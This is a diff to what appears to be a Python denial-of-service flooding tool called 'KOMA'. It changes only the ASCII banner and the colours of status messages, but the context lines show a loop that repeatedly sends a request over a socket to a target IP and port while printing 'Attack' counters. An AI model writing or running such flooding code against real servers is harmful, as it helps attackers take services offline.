@@ -15,15 +15,15 @@ import fade
 os.system("clear")
 logo = """
 _—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—
-_—                                                                     —_
-_—     ÷÷      ÷÷     ÷÷ ÷÷      ÷÷         ÷÷     ÷÷ ÷÷               —_
-_—     ÷÷    ÷÷     ÷÷      ÷÷   ÷÷ ÷÷   ÷÷ ÷÷   ÷÷     ÷÷             —_
-_—     ÷÷  ÷÷      ÷÷        ÷÷  ÷÷  ÷÷ ÷÷  ÷÷  ÷÷       ÷÷            —_
-_—     ÷÷ ÷÷       ÷÷        ÷÷  ÷÷   ÷÷    ÷÷  ÷÷       ÷÷            —_
-_—     ÷÷  ÷÷      ÷÷        ÷÷  ÷÷         ÷÷  ÷÷       ÷÷            —_
-_—     ÷÷    ÷÷     ÷÷      ÷÷   ÷÷         ÷÷  ÷÷ ÷÷ ÷÷ ÷÷            —_
-_—     ÷÷      ÷÷      ÷÷ ÷÷     ÷÷         ÷÷  ÷÷       ÷÷            —_
-_—                                                                     —_                                                                          —_
+_—                                                                   —_
+_—     ÷÷      ÷÷     ÷÷ ÷÷      ÷÷         ÷÷     ÷÷ ÷÷             —_
+_—     ÷÷    ÷÷     ÷÷      ÷÷   ÷÷ ÷÷   ÷÷ ÷÷   ÷÷     ÷÷           —_
+_—     ÷÷  ÷÷      ÷÷        ÷÷  ÷÷  ÷÷ ÷÷  ÷÷  ÷÷       ÷÷          —_
+_—     ÷÷ ÷÷       ÷÷        ÷÷  ÷÷   ÷÷    ÷÷  ÷÷       ÷÷          —_
+_—     ÷÷  ÷÷      ÷÷        ÷÷  ÷÷         ÷÷  ÷÷       ÷÷          —_
+_—     ÷÷    ÷÷     ÷÷      ÷÷   ÷÷         ÷÷  ÷÷ ÷÷ ÷÷ ÷÷          —_
+_—     ÷÷      ÷÷      ÷÷ ÷÷     ÷÷         ÷÷  ÷÷       ÷÷          —_
+_—                                                                   —_                                                                          —_
 _—  \033[33m             use this script for good purpose              —_  
 _—  \033[32m                      design by: Za'99                     —_
 _—  \033[97m                          --oO0Oo--                        —_
@@ -97,13 +97,13 @@ def start():
             for i in range(packs):
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[⚡\033[37mKOMA\033[96m]  \033[92mAttack {0}:{1}  \033[33mSent::..{2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[96m[★\033[96m]  \033[97mKOMA\033[96m]  \033[92mAttack {0}:{1}  \033[33mSent::..{2}\033[0m".format(str(ip), int(port), xx))
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[⚡\033[33mKOMA\033[96m]  \033[92mAttack {0}:{1}  \033[37mSent::..{2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[96m[★\033[96m]  \033[32mKOMA\033[96m]  \033[92mAttack {0}:{1}  \033[37mSent::..{2}\033[0m".format(str(ip), int(port), xx))
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[⚡\033[32mKOMA\033[96m]  \033[92mAttack {0}:{1}  \033[34mSent::..{2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[96m[★\033[96m]  \033[33mKOMA\033[96m]  \033[92mAttack {0}:{1}  \033[34mSent::..{2}\033[0m".format(str(ip), int(port), xx))
         
         except:
                s.close()
